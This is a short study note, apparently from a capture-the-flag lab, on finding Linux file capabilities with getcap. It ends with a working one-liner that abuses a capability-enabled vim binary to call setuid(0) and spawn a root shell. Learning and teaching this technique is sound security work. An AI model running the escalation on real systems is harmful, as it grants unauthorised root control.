---
title: Linux Capabilities Enumeration
category: linux-privilege-escalation
tags: [ks-import, capabilities, getcap, privilege-escalation, linux]
source: linux prev/attack4.md
sourceId: 10022
---
📂 STREAMLINED OBSIDIAN VAULT ENTRY

Copy this high-density card into your vault:

> ==**Title: Linux PrivEsc - Linux Capabilities (getcap)**==
Tags: #Linux #PrivEsc #Capabilities #getcap #setcap #GTFOBins

> ```
>     Concept: Granular root privilege division stored in file extended attributes (xattr), bypassing SUID permission indicators.
> ```
> 
>     ==**Enumeration Command: 
```
>     getcap -r / 2>/dev/null
```

>     ==**The Flags: 
>     e = Effective,
>      p = Permitted, 
>      i = Inheritable.**==

```
vim -c 'some command'
```

> ==**It means:==**
> 
> **==1. Start vim==**
> **==2. Immediately run the command you gave after -c==**
> **==3. Then continue**==

```
/home/karen/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```
